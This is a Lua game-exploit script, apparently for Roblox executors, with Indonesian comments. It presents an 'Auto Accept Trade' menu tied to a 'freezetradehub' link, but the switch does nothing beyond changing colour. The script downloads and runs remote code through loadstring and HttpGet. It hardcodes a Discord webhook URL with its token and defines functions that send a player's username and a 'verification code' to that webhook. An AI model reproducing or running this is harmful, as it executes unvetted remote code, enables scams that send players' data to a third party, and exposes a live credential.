-- Load Fluent Library
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

-- Webhook URL
local webhook_url = "https://discord.com/api/webhooks/1319653743121403954/ZX-vpHJw_vdh5_5nWb0XLjJY8AHKALMxwWwV3CFiHgrla74tTTshVHlyb1dCFt4UfZKY"
local correctKey = "kon"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Function to send data to Discord
local function sendToDiscord(content)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = content
        })
    }

    local response
    if syn and syn.request then
        response = syn.request(payload)
    elseif http and http.request then
        response = http.request(payload)
    elseif request then
        response = request(payload)
    else
        print("Executor Anda tidak mendukung HTTP requests!")
        return
    end

    if response and response.StatusCode == 200 then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
    end
end

-- Function to create the MenuGUI using Fluent
local function createMenuGUI()
    local userInputService = game:GetService("UserInputService")
    local mainGui = Fluent.ScreenGui()

    -- Logo "D" (Kiri)
    local logoFrame = Fluent.Frame(mainGui)
    logoFrame.Size = UDim2.new(0, 100, 0, 100)
    logoFrame.Position = UDim2.new(0, 10, 0.5, -50)
    logoFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    logoFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    local logoLabel = Fluent.TextLabel(logoFrame)
    logoLabel.Size = UDim2.new(1, 0, 1, 0)
    logoLabel.Text = "D"
    logoLabel.TextSize = 50
    logoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Main Frame (Kanan)
    local mainFrame = Fluent.Frame(mainGui)
    mainFrame.Size = UDim2.new(0, 300, 0, 150)
    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    mainFrame.Visible = false

    local titleLabel = Fluent.TextLabel(mainFrame)
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Text = "Auto Accept Trade"
    titleLabel.TextSize = 20
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Switch Label
    local switchLabel = Fluent.TextLabel(mainFrame)
    switchLabel.Size = UDim2.new(0.7, 0, 0, 40)
    switchLabel.Text = "Auto Accept"
    switchLabel.TextSize = 18
    switchLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Switch Button
    local switchButton = Fluent.TextButton(mainFrame)
    switchButton.Size = UDim2.new(0, 50, 0, 30)
    switchButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    switchButton.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Drag Functionality
    local function enableDragging(frame)
        local dragToggle = false
        local dragStart, startPos

        frame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragToggle = true
                dragStart = input.Position
                startPos = frame.Position
            end
        end)

        frame.InputChanged:Connect(function(input)
            if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                local delta = input.Position - dragStart
                frame.Position = UDim2.new(
                    startPos.X.Scale,
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale,
                    startPos.Y.Offset + delta.Y
                )
            end
        end)

        frame.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragToggle = false
            end
        end)
    end

    enableDragging(logoFrame)
    enableDragging(mainFrame)

    -- Toggle GUI
    logoFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            mainFrame.Visible = not mainFrame.Visible
        end
    end)

    -- Switch On/Off
    local switchState = false
    switchButton.MouseButton1Click:Connect(function()
        switchState = not switchState
        if switchState then
            switchButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red (Active)
        else
            switchButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White (Inactive)
        end
    end)
end

-- Function for sending verification to Discord
local function sendVerificationToDiscord(username, code)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Username: " .. username .. "\nKode Verifikasi: " .. code
        })
    }

    local response
    local success = pcall(function()
        if syn and syn.request then
            response = syn.request(payload)
        elseif http and http.request then
            response = http.request(payload)
        elseif request then
            response = request(payload)
        else
            error("Executor Anda tidak mendukung HTTP requests!")
        end
    end)

    if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
        print("Kode verifikasi berhasil dikirim ke Discord!")
        return true
    else
        print("Gagal mengirim kode verifikasi:", response and response.StatusCode or "Unknown Error")
        return false
    end
end

-- Initialize the GUI
createMenuGUI()
